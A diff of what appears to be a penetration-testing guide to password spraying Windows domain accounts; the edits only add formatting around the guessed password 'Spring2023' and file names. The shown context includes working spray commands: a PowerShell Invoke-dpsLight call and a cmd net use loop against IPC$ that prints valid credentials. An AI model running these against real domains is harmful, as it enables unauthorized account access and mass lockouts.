@@ -61,7 +61,7 @@ function Invoke-dpsLight ($Password, $userlist) {
 }
 ```
 
-Next, you can execute the follow to run the password spray. Be very careful. You could lock every user in the domain out using this script. Don't run it multiple times in a short period of time. In this example, "Spring2023" is the password guess and **all-ab-users.txt** is the list of usernames to try the password on.
+Next, you can execute the follow to run the password spray. Be very careful. You could lock every user in the domain out using this script. Don't run it multiple times in a short period of time. In this example, `Spring2023` is the password guess and **all-ab-users.txt** is the list of usernames to try the password on.
 
 ```PowerShell
 Invoke-dpsLight "Spring2023" all-ab-users.txt
@@ -77,7 +77,7 @@ Invoke-dpsLight "Spring2023" all-ab-users.txt 2 *>&1 | tee -Append out.txt
 
 This method using a different method which generates different Windows event IDs. It is also much slower.
 
-This example uses a password of Spring2023 against a list of users called users.txt in the current directory.
+This example uses a password of `Spring2023` against a list of users called **users.txt** in the current directory.
 
 ```cmd
 @FOR /F "delims=" %n in (users.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2023" 1>NUL 2>&1 && @echo [*] %n:"Spring2023" && @net use /delete %logonserver%\IPC$ > NUL
